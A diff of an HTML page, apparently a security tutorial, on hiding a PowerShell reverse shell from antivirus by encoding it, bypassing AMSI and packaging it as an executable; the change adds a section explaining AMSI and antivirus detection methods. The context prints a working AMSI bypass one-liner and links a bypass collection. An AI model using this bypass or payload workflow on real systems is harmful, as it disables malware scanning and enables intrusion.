@@ -431,6 +431,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#theory" class="md-nav__link">
+    Theory
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#steps" class="md-nav__link">
     Steps
   </a>
@@ -969,6 +976,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#theory" class="md-nav__link">
+    Theory
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#steps" class="md-nav__link">
     Steps
   </a>
@@ -1077,6 +1091,23 @@
 <li>Coverting the encoded script &amp; AMSI bypass script into executable file. </li>
 <li>Delivering the Payload. </li>
 </ol>
+<h2 id="theory">Theory<a class="headerlink" href="#theory" title="Permanent link">&para;</a></h2>
+<p>I'll explain here some of basic concepts of AMSI, how Anti-Virus products detect the malware and etc. So if you know the concepts you can skip this part. </p>
+<ul>
+<li>
+<p><strong>AMSI</strong>:</p>
+<p>AMSI stands for Anti Malware Scan Interface. AMSI is an interface for applications and services to integrate with antimalware products. AMSI used for scanning files and memory streams, content source, URL/IP reputation checks and other techniques. </p>
+</li>
+<li>
+<p><strong>Detection Methods in Anti-Virus</strong>:</p>
+<ul>
+<li><strong>Signature Based</strong>: by matching strings, signatures, hashes and patterns of known malware from the database. </li>
+<li><strong>Heuristic Based</strong>: it is similar to signature based detection in terms of searching for specific strings, it looks for commands that has malicious intent and would not be mostly found in an application.</li>
+<li><strong>Behavioral Based</strong>: it looks for events to created by the program. As an example, spawinng <code>cmd.exe</code> or calling a sequence of functions that indicate potential process injection. </li>
+<li><strong>Sandbox Detection</strong>: In this type of detection, the program runs in virtualized environment and it is behavior is recorded at the end analyzed. The anti-virus application will be able to see in details what the program will do in that environment. </li>
+</ul>
+</li>
+</ul>
 <hr />
 <h2 id="steps">Steps<a class="headerlink" href="#steps" title="Permanent link">&para;</a></h2>
 <h3 id="download-reverse-shell-ps-script">Download Reverse Shell PS Script<a class="headerlink" href="#download-reverse-shell-ps-script" title="Permanent link">&para;</a></h3>
@@ -1193,7 +1224,7 @@ Create new <code>PS</code> script and paste the obfuscated powershell script. In
 <span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">echo </span><span class="nv">$encodedtext</span>
 </code></pre></div></p>
 <h3 id="bypass-amsi">Bypass AMSI<a class="headerlink" href="#bypass-amsi" title="Permanent link">&para;</a></h3>
-<p>Now let's move on the AMSI part, AMSI stands from Windows Antimalware Scan Interface, it designed for malware scanning and protection. wW need first to bypass the AMSI then we can run our reverse shell script. Again we will use here <code>PowerShell ISE</code> to obfuscate the script.  </p>
+<p>Now let's move on the AMSI part,we need first to bypass the AMSI then we can run our reverse shell script. Again we will use here <code>PowerShell ISE</code> to obfuscate the script.  </p>
 <p>Get any AMSI bypass method from the following link: <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></p>
 <p><strong>Example:</strong> </p>
 <p><div class="highlight"><pre><span></span><code><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;amsiInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>
